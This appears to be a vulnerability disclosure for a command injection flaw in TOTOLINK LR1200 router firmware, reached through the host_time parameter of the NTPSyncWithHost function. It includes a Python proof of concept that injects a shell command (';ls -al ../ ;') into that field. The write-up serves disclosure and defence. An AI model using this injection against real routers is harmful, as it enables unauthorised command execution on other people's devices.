## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://totolink.com.my/products/lr1200/

## Affected version

LR1200 V9.3.1cu.2832

## Vulnerability details

The LR1200 V9.3.1cu.2832 firmware has a command injection vulnerability in the `NTPSyncWithHost` function. The `v4` variable receives the `host_time` parameter from a POST request. However, since the user can control the input of `host_time`, the telnet service can cause a command injection vulnerability.

![image-20240722010725076](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240722010725076.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {
    "topicurl":"NTPSyncWithHost",
    "host_time":";ls -al ../ ;"
}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721213628055](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721213628055.png)
